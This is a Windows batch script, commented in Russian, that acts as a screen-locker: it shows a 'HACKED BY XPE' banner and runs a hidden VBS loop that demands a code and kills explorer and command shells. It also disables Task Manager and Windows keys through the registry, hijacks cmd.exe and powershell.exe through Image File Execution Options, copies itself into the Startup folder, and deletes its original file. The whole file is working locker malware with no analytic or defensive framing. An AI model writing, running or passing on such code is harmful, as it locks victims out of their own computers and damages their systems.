@echo off
title System Lock
cd %tmp%

:: 1) Вывод баннера "hacked by xpe" перед блокировкой
cls
color 0C
echo =============================================
echo           HACKED BY XPE
echo =============================================
timeout /t 2 /nobreak >nul

:: 2) Создание скрытого VBS-блокиратора с "by xpe" внутри окна ввода
echo Set objShell = CreateObject("Wscript.Shell") > lock.vbs
echo do >> lock.vbs
echo msg = "by xpe" >> lock.vbs
echo input = InputBox(msg, "System Locked", "") >> lock.vbs
echo if input = "0159" Then >> lock.vbs
echo    Exit Do >> lock.vbs
echo else >> lock.vbs
echo    objShell.Run "taskkill /f /im cmd.exe", 0, False >> lock.vbs
echo    objShell.Run "taskkill /f /im explorer.exe", 0, False >> lock.vbs
echo    objShell.Run "taskkill /f /im conhost.exe", 0, False >> lock.vbs
echo end if >> lock.vbs
echo loop >> lock.vbs

:: 3) Скрытый запуск VBS без окон
echo CreateObject("Wscript.Shell").Run "lock.vbs", 0, False > run.vbs
cscript //nologo run.vbs

:: 4) Отключение диспетчера задач
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: 5) Отключение Win+R, Win и Alt+F4
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f

:: 6) Зацикливание процесса
:loop
start /b cscript //nologo lock.vbs
timeout /t 2 /nobreak >nul
tasklist | find "cscript.exe" >nul
if errorlevel 1 goto loop

:: 7) Блокировка новых процессов cmd/powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe" /v Debugger /t REG_SZ /d "taskkill /f /im %%1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe" /v Debugger /t REG_SZ /d "taskkill /f /im %%1" /f

:: 8) Саморепликация и удаление исходника
copy "%~f0" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\syslock.bat"
start /min cmd /c timeout /t 5 /nobreak & del /f /q "%~f0"
exit